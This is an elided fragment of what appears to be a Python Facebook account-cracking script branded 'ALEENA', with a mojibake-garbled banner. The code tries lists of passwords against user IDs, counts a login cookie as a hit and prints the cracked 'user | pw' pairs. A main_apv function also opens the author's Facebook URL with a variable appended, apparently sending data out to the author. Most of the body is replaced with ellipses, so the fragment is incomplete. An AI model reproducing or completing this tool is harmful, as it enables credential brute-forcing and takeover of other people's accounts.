...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://www.facebook.com/Aleena.tricker?text=' + tks)
...
_____________OFFICIAL_WORK___________

 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]

     '\x1b[1;91m' â˜†Msâ˜†â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢âœ¯ALEENAâœ¯

'\x1b[1;91m'   Author      ||    ALEENAðŸ™‚   

'\x1b[1;92m'   Github      ||     ERROR

'\x1b[1;93m'   FB ID       ||    NOI HAIðŸ˜‚
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[ALEENA🖇️]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ALEENA-OK ðŸ”¥] {user} | {pw}")
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      DO SUPPORTðŸ™‚  \033[1;37m")
            ...
            print("\033[1;32m      DO SUPPORT ðŸ™‚ \033[1;37m")
